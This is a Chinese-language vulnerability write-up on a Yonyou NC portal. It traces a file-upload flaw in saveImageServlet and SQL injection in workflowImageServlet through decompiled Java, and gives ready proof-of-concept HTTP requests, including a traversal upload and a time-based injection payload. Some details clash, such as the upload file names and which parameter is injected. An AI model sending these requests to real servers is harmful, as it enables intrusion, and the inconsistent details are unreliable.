## 源码
```
链接:https://pan.baidu.com/s/10V-1Foq6MJp82JDF3NHKxg  提取码:9496
```

## saveImageServlet 任意文件上传漏洞分析

官方更新了一个漏洞，说saveImageServlet接口存在任意文件上传漏洞 ，分析一下

```java
package nc.uap.wfm.action;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FilterOutputStream;
import java.io.IOException;
import java.util.UUID;
import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.wfm.action.WfBaseServlet;
import nc.uap.wfm.logger.WfmLogger;

@Servlet(path="/servlet/saveImageServlet")
public class SaveImageServlet
extends WfBaseServlet {
    private static final long serialVersionUID = -5603687395645617927L;

    @Action(method="POST")
    public void doPost() throws ServletException, IOException {
        this.response.setContentType("application/octet-stream");
        String filename = this.request.getParameter("filename");
        if (filename == null || "".equals(filename)) {
            filename = UUID.randomUUID().toString();
        }
        filename = filename + ".png";
        String savePath = this.request.getRealPath("") + "/processxml/images/" + filename;
        ServletInputStream is = this.request.getInputStream();
        FilterOutputStream dos = null;
        try {
            int size = 0;
            byte[] tmp = new byte[10240];
            File f = new File(savePath);
            dos = new DataOutputStream(new FileOutputStream(f));
            int len = -1;
            while ((len = is.read(tmp)) != -1) {
                ((DataOutputStream)dos).write(tmp, 0, len);
                size += len;
            }
            ((DataOutputStream)dos).flush();
            dos.close();
        }
        catch (IOException e) {
            WfmLogger.error((String)e.getMessage(), (Throwable)e);
            throw new LfwRuntimeException(e.getMessage());
        }
        finally {
            try {
                if (is != null) {
                    is.close();
                }
            }
            catch (Exception e) {
                WfmLogger.error((Throwable)e);
            }
            try {
                if (dos != null) {
                    dos.close();
                }
            }
            catch (Exception e) {
                WfmLogger.error((Throwable)e);
            }
        }
    }
}

```
![image](https://github.com/wy876/JavaCode/assets/139549762/0aad419b-a532-4e59-bd6f-45fa77ca57c4)

从代码上看，上传文件名进行了处理，` filename = filename + ".png";`   将后缀拼接上了.png格式然后将文件上传，因为强制加上了.png

按道理来说是不存在漏洞的

本地我也进行测试了，基本上不可以，上传的文件都被强制加上了png

![image](https://github.com/wy876/JavaCode/assets/139549762/470d6ac4-82b1-41e8-9c70-bbd786f6f757)

想起来之前网上有文章 利用Windows特性加上 `%00 ` 就成功上传了

![image](https://github.com/wy876/JavaCode/assets/139549762/f802bd33-a0c2-4b50-ab5a-a0e93f382bd7)



数据包：

```
POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../test.jsp HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: application/octet-stream
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19

111
```

文件上传路径`http://ip:port/portal/processxml/1.jsp`

## workflowImageServlet 注入漏洞分析
```java
@Servlet(path="/servlet/workflowImageServlet")
public class WorkflowImageServlet
extends WfBaseServlet {
    @Action
    public void doPost() {
        this.response.setHeader("Pragma", "No-cache");
        this.response.setHeader("Cache-Control", "no-cache");
        this.response.setDateHeader("Expires", 0L);
        String wfpk = this.request.getParameter("wfpk");
        String proInsPk = this.request.getParameter("proInsPk");
        DrawBoard drawboard = new DrawBoard();
        BufferedImage image = drawboard.getWorkflowImage(wfpk, proInsPk);
        try {
            ServletOutputStream sos = this.response.getOutputStream();
            ImageIO.write((RenderedImage)image, "JPEG", (OutputStream)this.response.getOutputStream());
            sos.flush();
            sos.close();
        }
        catch (IOException e) {
            WfmLogger.error((String)e.getMessage(), (Throwable)e);
            throw new LfwRuntimeException(NCLangRes4VoTransl.getNCLangRes().getStrByID("wfm", "WorkflowImageServlet-000001"));
        }
    }
}
```

![image](https://github.com/wy876/JavaCode/assets/139549762/143e5c2d-2148-4a46-a407-5bfe7c03519b)

在35行代码中`getWorkflowImage `接受了`wfpk`参数，跟踪进去

```java
    public BufferedImage getWorkflowImage(String wfpk, String proInsPk) {
        this.parseProDef(wfpk);
        ProcessDiagram di = this.proDef.getProcessDiagram();
        this.convertObject(di);
        if (proInsPk != null && !"".equals(proInsPk)) {
            ProInsParse.parseState(this, proInsPk);
        }

        return this.buildWorkflowImage(this.proDef);
    }
```
wfpk 参数有接着传入this.parseProDef(wfpk)  

在parseProDe方法中，wfpk 参数进入ProDefsContainer.getByProDefPkAndId(wfpk)

```java
    private void parseProDef(String wfpk) {
        if (wfpk != null && !"".equals(wfpk)) {
            ProDef proDef = ProDefsContainer.getByProDefPkAndId(wfpk);
            if (proDef == null) {
                throw new LfwRuntimeException(NCLangRes4VoTransl.getNCLangRes().getStrByID("wfm", "DrawBoard-000004"));
            } else {
                this.proDef = proDef;
                ProcessDiagram di = proDef.getProcessDiagram();
                this.setWidth(Integer.parseInt(di.getWidth()));
                this.setHeight(Integer.parseInt(di.getHeight()));
            }
        }
    }
```

进入 getByProDefPkAndId 方法，发现将参数`wfpk` 传到`getProDefByPkAndId`方法中

```
    public static ProDef getByProDefPkAndId(String proDefPk) {
        return getProDefByPkAndId(proDefPk);
    }
```

`getProDefByPkAndId`  在该方法中，把参数带入到` getProDefVOByProDefPk` 查询

```java
    private static ProDef getProDefByPkAndId(String proDefPk) {
        getInstance();
        ProDef proDef = ProDefsGlobalCache.getInstance().getProDefByPk(proDefPk);
        if (proDef == null) {
            WfmProdefVO vo = null;

            try {
                vo = ((IWfmProDefQry)NCLocator.getInstance().lookup(IWfmProDefQry.class)).getProDefVOByProDefPk(proDefPk);
            } catch (WfmServiceException var4) {
                WfmLogger.error(var4.getMessage(), var4);
                throw new LfwRuntimeException(var4.getMessage());
            }

            proDef = getProDef(vo);
            ProDefsGlobalCache.getInstance().setProDef(proDefPk, proDef);
        }

        return proDef;
    }
```

跟踪getProDefVOByProDefPk 

![image](https://github.com/wy876/JavaCode/assets/139549762/8d9f4836-f40c-47b1-8727-761a74e7c255)


发现该方法是IWfmProDefQry类的接口

直接搜索看看那个文件引用了该接口类 IWfmProDefQry

![image](https://github.com/wy876/JavaCode/assets/139549762/0427a3b8-233c-4e31-bf51-d69c155897ed)

![image](https://github.com/wy876/JavaCode/assets/139549762/9964843a-a60a-4965-b129-1785a1a09c91)

从WfmProDefQry类中找到getProDefVOByProDefPk方法

![image](https://github.com/wy876/JavaCode/assets/139549762/213e2b50-eced-4f55-b8ee-aeba067811dc)


直接字符串拼接造成sql注入

```java
    public WfmProdefVO getProDefVOByProDefPk(String proDefPk) throws WfmServiceException {
        PtBaseDAO dao = new PtBaseDAO();
        SuperVO[] superVos = null;
        try {
            superVos = dao.queryByCondition(WfmProdefVO.class, "pk_prodef='" + proDefPk + "'");
        }
        catch (DAOException e) {
            WfmLogger.error((String)e.getMessage(), (Throwable)e);
            throw new LfwRuntimeException(e.getMessage());
        }
        if (superVos == null || superVos.length == 0) {
            return null;
        }
        return (WfmProdefVO)superVos[0];
    }
```

数据包：
```
GET /portal/pt/servlet/workflowImageServlet/doPost?pageId=login&wfpk=1&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19
```
![image](https://github.com/wy876/JavaCode/assets/139549762/447d58f0-4332-4a41-b2d6-80f061b03f9b)


